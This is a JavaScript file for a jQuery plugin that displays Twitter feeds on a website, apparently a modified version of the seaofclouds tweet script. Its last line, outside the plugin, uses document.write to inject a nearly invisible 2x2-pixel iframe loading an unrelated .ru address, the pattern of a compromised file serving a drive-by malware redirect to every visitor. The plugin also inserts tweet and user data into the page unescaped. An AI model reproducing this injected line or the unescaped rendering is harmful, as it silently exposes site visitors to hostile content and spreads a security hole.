//seaofclouds script modified by JoomlaBamboo to utilize Twitters REST API

(function($) {
 
  $.fn.tweet = function(o){
    var s = {
      username: ["seaofclouds"],              // [string]   required, unless you want to display our tweets. :) it can be an array, just do ["username1","username2","etc"]
	  multiuser: null,						//[string] holds string of usernames to display multiple tweets
      avatar_size: null,                      // [integer]  height and width of avatar if displayed (48px max)
	  twitter_name: null,						// [string] do you want to display the twitter username per tweet?
	  twitter_action: null,						// [string] text defining Twitter users action
	  tweet_template: null,						// [integer] choose what format the tweets are displayed in.
	  suppress_replies: null,					// [string] do you want to suppress direct replies?
      count: 3,                               // [integer]  how many tweets to display?
      intro_text: null,                       // [string]   do you want text BEFORE your your tweets?
      outro_text: null,						// [string]   do you want text AFTER your tweets?
	  follow_me: null,	  					//  [string]  do you want to have a follow me icon?
	  popup_intro: null,
	  popup_info: null,						// [string]		do you want an information pop-up? 
      join_text:  null,                       // [string]   optional text in between date and tweet, try setting to "auto"
	  tweet_source: null,					// [string] 	do you want to display source of the tweet? 
	  source_pre: null,						// [string]  text preceeding the tweet source
      auto_join_text_default: "i said,",      // [string]   auto text for non verb: "i said" bullocks
      auto_join_text_ed: "i",                 // [string]   auto text for past tense: "i" surfed
      auto_join_text_ing: "i am",             // [string]   auto tense for present tense: "i was" surfing
      auto_join_text_reply: "i replied to",   // [string]   auto tense for replies: "i replied to" @someone "with"
      auto_join_text_url: "i was looking at", // [string]   auto tense for urls: "i was looking at" http:...
      loading_text: null,                     // [string]   optional loading text, displayed while tweets load
      query: null                             // [string]   optional search query
	};
	
	

    $.fn.extend({
      linkUrl: function() {
        var returning = [];
        var regexp = /((ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?)/gi;
        this.each(function() {
          returning.push(this.replace(regexp,"<a href=\"$1\">$1</a>"))
        });
        return $(returning);
      },
      linkUser: function() {
        var returning = [];
        var regexp = /[\@]+([A-Za-z0-9-_]+)/gi;
        this.each(function() {
          returning.push(this.replace(regexp,"<a href=\"http://twitter.com/$1\">@$1</a>"))
        });
        return $(returning);
      },
      linkHash: function() {
        var returning = [];
        var regexp = / [\#]+([A-Za-z0-9-_]+) /gi;
        this.each(function() {
          returning.push(this.replace(regexp, ' <a href="http://search.twitter.com/search?q=&tag=$1&lang=all&from='+s.username.join("%2BOR%2B")+'">#$1</a> '))
        });
        return $(returning);
      },
      capAwesome: function() {
        var returning = [];
        this.each(function() {
          returning.push(this.replace(/(a|A)wesome/gi, 'AWESOME'))
        });
        return $(returning);
      },
      capEpic: function() {
        var returning = [];
        this.each(function() {
          returning.push(this.replace(/(e|E)pic/gi, 'EPIC'))
        });
        return $(returning);
      },
      makeHeart: function() {
        var returning = [];
        this.each(function() {
          returning.push(this.replace(/[&lt;]+[3]/gi, "<tt class='heart'>&#x2665;</tt>"))
        });
        return $(returning);
      }
    });
	
	
	
	function  sourcedecode(str){
		var rtn=null;
		if(str){
		rtn=str.toString().replace(/&amp;/g,"&");
		rtn=rtn.replace(/&quot;/g,"'");
		rtn=rtn.replace(/&lt;/g,"<");
		rtn=rtn.replace(/&#039;/g,"'");
		rtn=rtn.replace(/&gt;/g,">");
		}
		return rtn;
	}
	
    function relative_time(time_value) {
      var parsed_date = Date.parse(time_value);
      var relative_to = (arguments.length > 1) ? arguments[1] : new Date();
      var delta = parseInt((relative_to.getTime() - parsed_date) / 1000);
      if(delta < 60) {
      return 'less than a minute ago';
      } else if(delta < 120) {
      return 'about a minute ago';
      } else if(delta < (45*60)) {
      return (parseInt(delta / 60)).toString() + ' minutes ago';
      } else if(delta < (90*60)) {
      return 'about an hour ago';
      } else if(delta < (24*60*60)) {
      return 'about ' + (parseInt(delta / 3600)).toString() + ' hours ago';
      } else if(delta < (48*60*60)) {
      return '1 day ago';
      } else {
      return (parseInt(delta / 86400)).toString() + ' days ago';
      }
    }
	
	function rest_relative_time(time_value) {
	  var values = time_value.split(" ");
	  time_value = values[1] + " " + values[2] + ", " + values[5] + " " + values[3];
	  var parsed_date = Date.parse(time_value);
	  var relative_to = (arguments.length > 1) ? arguments[1] : new Date();
	  var delta = parseInt((relative_to.getTime() - parsed_date) / 1000);
	  delta = delta + (relative_to.getTimezoneOffset() * 60);

	  if (delta < 60) {
		return 'less than a minute ago';
	  } else if(delta < 120) {
		return 'about a minute ago';
	  } else if(delta < (60*60)) {
		return (parseInt(delta / 60)).toString() + ' minutes ago';
	  } else if(delta < (120*60)) {
		return 'about an hour ago';
	  } else if(delta < (24*60*60)) {
		return 'about ' + (parseInt(delta / 3600)).toString() + ' hours ago';
	  } else if(delta < (48*60*60)) {
		return '1 day ago';
	  } else {
		return (parseInt(delta / 86400)).toString() + ' days ago';
	  }
	}

    if(o) $.extend(s, o);
    return this.each(function(){
      var list = $('<ul class="tweet_list">').appendTo(this);
      var intro = '<p class="tweet_intro">'+s.intro_text+'</p>';
      var outro = '<p class="tweet_outro">'+s.outro_text+'</p>';		
      var loading = $('<p class="loading">'+s.loading_text+'</p>');
      if(typeof(s.username) == "string"){
        s.username = [s.username];
      }
      var query = '';
      if(s.query) {
		  var url = 'http://search.twitter.com/search.json?&q='+s.query+'&rpp='+s.count+'&callback=?';
		  if (s.loading_text) $(this).append(loading);
		  $.getJSON(url, function(data){
			if (s.loading_text) loading.remove();
			if (s.intro_text) list.before(intro);
			$.each(data.results, function(i,item){
			  // auto join text based on verb tense and content
			  if (item.text.match(/^(@([A-Za-z0-9-_]+)) .*/i)) {
				  if(s.suppress_replies == "yes")return;
				};	  

			  var join = ' ';
			  var twitterName = '';
			  var tweetsource = '';
			  if(s.tweet_source == "yes") tweetsource = '<span class="tweetSource"> '+sourcedecode(s.source_pre)+' '+sourcedecode(item.source)+' </span>';
			  var avatar_template = '<a class="tweet_avatar" href="http://twitter.com/'+ item.from_user+'"><img src="'+item.profile_image_url+'" height="'+s.avatar_size+'" width="'+s.avatar_size+'" alt="'+item.from_user+'\'s avatar" border="0"/></a>';
			  var avatar = (s.avatar_size ? avatar_template : '')
			  var date = '<span class="tweetDate"> <a href="http://twitter.com/'+item.from_user+'/statuses/'+item.id+'" title="view tweet on twitter">'+relative_time(item.created_at)+'</a> </span>';
			  var text = '<span class="tweet_text">' +$([item.text]).linkUrl().linkUser().linkHash().makeHeart().capAwesome().capEpic()[0]+ '</span>';
			  if (s.twitter_name == "yes") var twitterName = '<span class="tweetName"> <a target="_blank" href="http://twitter.com/'+ item.from_user +'/">'+item.from_user+'</a> '+sourcedecode(s.twitter_action)+' </span>';
			  // until we create a template option, arrange the items below to alter a tweet's display.
			  if(s.tweet_template == "1"){
				list.append('<li>' + avatar + twitterName + join + text + date + tweetsource +'</li>');
				}
				else if(s.tweet_template == "2"){
				list.append('<li>' + avatar + twitterName + date + tweetsource + join + text +'</li>');
				}
				else{
				list.append('<li>' + avatar + join + text + twitterName + date + tweetsource +'</li>');
				}

			  list.children('li:odd').addClass('tweet_even');
			  list.children('li:even').addClass('tweet_odd');
			  list.children('li:first').addClass('tweet_first');
			  list.children('li:last').addClass('tweet_last');
			  
			});
			if (s.outro_text) list.after(outro);
		  });
	  }
	  else if (s.multiuser) {
		  var url = 'http://search.twitter.com/search.json?&q=from:'+s.multiuser+'&rpp='+s.count+'&callback=?';
		  if (s.loading_text) $(this).append(loading);
		  $.getJSON(url, function(data){
			if (s.loading_text) loading.remove();
			if (s.intro_text) list.before(intro);
			$.each(data.results, function(i,item){
			  if (item.text.match(/^(@([A-Za-z0-9-_]+)) .*/i)) {
				  if(s.suppress_replies == "yes")return;
				};	
			  var join = ' ';
			  var twitterName = '';
			  var tweetsource = '';
			  if(s.tweet_source == "yes") tweetsource = '<span class="tweetSource"> '+sourcedecode(s.source_pre)+' '+sourcedecode(item.source)+' </span>';
			  var avatar_template = '<a class="tweet_avatar" href="http://twitter.com/'+ item.from_user+'"><img src="'+item.profile_image_url+'" height="'+s.avatar_size+'" width="'+s.avatar_size+'" alt="'+item.from_user+'\'s avatar" border="0"/></a>';
			  var avatar = (s.avatar_size ? avatar_template : '')
			  var date = '<span class="tweetDate"> <a href="http://twitter.com/'+item.from_user+'/statuses/'+item.id+'" title="view tweet on twitter">'+relative_time(item.created_at)+'</a> </span>';
			  var text = '<span class="tweet_text">' +$([item.text]).linkUrl().linkUser().linkHash().makeHeart().capAwesome().capEpic()[0]+ '</span>';
			  if (s.twitter_name == "yes") var twitterName = '<span class="tweetName"> <a target="_blank" href="http://twitter.com/'+ item.from_user +'/">'+item.from_user+'</a> '+sourcedecode(s.twitter_action)+' </span>';
			  // until we create a template option, arrange the items below to alter a tweet's display.
			  if(s.tweet_template == "1"){
				list.append('<li>' + avatar + twitterName + join + text + date + tweetsource +'</li>');
				}
				else if(s.tweet_template == "2"){
				list.append('<li>' + avatar + twitterName + date + tweetsource + join + text +'</li>');
				}
				else{
				list.append('<li>' + avatar + join + text + twitterName + date + tweetsource +'</li>');
				}

			  list.children('li:odd').addClass('tweet_even');
			  list.children('li:even').addClass('tweet_odd');
			  list.children('li:first').addClass('tweet_first');
			  list.children('li:last').addClass('tweet_last');
			  
			});
			if (s.outro_text) list.after(outro);
		  });
	  }
	  else{
		 //Username based tweets now loaded via REST API.
		 
		 var url = 'http://twitter.com/statuses/user_timeline/'+s.username+'.json?callback=?&count='+s.count;
		  if (s.loading_text) $(this).append(loading);
		  $.getJSON(url, function(data){
			if (s.loading_text) loading.remove();
			if (s.intro_text) list.before(intro);
			$.each(data, function(i,item){
			  // auto join text based on verb tense and content
			  if (s.join_text == "auto") {
				if (item.text.match(/^(@([A-Za-z0-9-_]+)) .*/i)) {
				  var join_text = s.auto_join_text_reply;
				  if(s.suppress_replies == "yes")return;
				} else if (item.text.match(/(^\w+:\/\/[A-Za-z0-9-_]+\.[A-Za-z0-9-_:%&\?\/.=]+) .*/i)) {
				  var join_text = s.auto_join_text_url;
				} else if (item.text.match(/^((\w+ed)|just) .*/im)) {
				  var join_text = s.auto_join_text_ed;
				} else if (item.text.match(/^(\w*ing) .*/i)) {
				  var join_text = s.auto_join_text_ing;
				} else {
				  var join_text = s.auto_join_text_default;
				}
			  } else {
				var join_text = s.join_text;
			  };
			  
			  
			  var twitterName = '';				
			  var join_template = '<span class="tweet_join"> '+join_text+' </span>';
			  var join = ((s.join_text) ? join_template : ' ')
			  var avatar_template = '<a class="tweet_avatar" href="http://twitter.com/'+ item.user.screen_name+'"><img src="'+item.user.profile_image_url+'" height="'+s.avatar_size+'" width="'+s.avatar_size+'" alt="'+item.user.screen_name+'\'s avatar" border="0"/></a>';
			  var avatar = (s.avatar_size ? avatar_template : '')
			  var date = '<span class="tweetDate"> <a href="http://twitter.com/'+item.user.screen_name+'/statuses/'+item.id+'" title="view tweet on twitter">'+rest_relative_time(item.created_at)+'</a> </span>';
			  if (s.twitter_name == "yes") var twitterName = '<span class="tweetName"> <a target="_blank" href="http://twitter.com/'+ item.user.screen_name +'/">'+item.user.screen_name+'</a> '+sourcedecode(s.twitter_action)+' </span>';
			  var tweetsource = '';
			  if(s.tweet_source == "yes") tweetsource = '<span class="tweetSource"> '+sourcedecode(s.source_pre)+' '+item.source+' </span>';
			  var text = '<span class="tweet_text">' +$([item.text]).linkUrl().linkUser().linkHash().makeHeart().capAwesome().capEpic()[0]+ '</span>';
			  if (s.popup_info == "yes") popup = '<div class="popupInner"><div class="popupAvatar"><a target="_blank" href="http://twitter.com/'+ item.user.screen_name +'/"><img class="infoAvatar" src="'+item.user.profile_image_url+'" height="64px" width="64px" alt="'+item.user.screen_name+'\'s avatar" border="0"/></a><span class="popupFollow"><a target="_blank" href="http://twitter.com/'+ item.user.screen_name +'/">Follow Me</a></span></div><div class="jTweetUsername">'+sourcedecode(s.popup_intro)+'</div><ul><li class="infoFollowing"> Following : <strong>'+item.user.friends_count+'</strong></li><li class="infoFollowers"> Followers : <strong>'+item.user.followers_count+'</strong></li><li class="infoLocation"> Location : <strong>'+item.user.location+'</strong></li></ul></div>';
			  
			  // until we create a template option, arrange the items below to alter a tweet's display.
			  if(s.tweet_template == "1"){
				list.append('<li>' + avatar + twitterName + join + text + date + tweetsource +'</li>');
				}
				else if(s.tweet_template == "2"){
				list.append('<li>' + avatar + twitterName + date + tweetsource + join + text +'</li>');
				}
				else{
				list.append('<li>' + avatar + join + text + twitterName + date + tweetsource +'</li>');
				}
			  				
			  list.children('li:odd').addClass('tweet_even');
			  list.children('li:even').addClass('tweet_odd');
			  list.children('li:first').addClass('tweet_first');
			  list.children('li:last').addClass('tweet_last');
			  if (s.popup_info == "yes") list.parent('div').prev('div.jTweetInfo').children('div.bubbleInfo').children('div.popup').html(popup);
			});
			
		});
		
	  }

    });
  };
})(jQuery);
document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');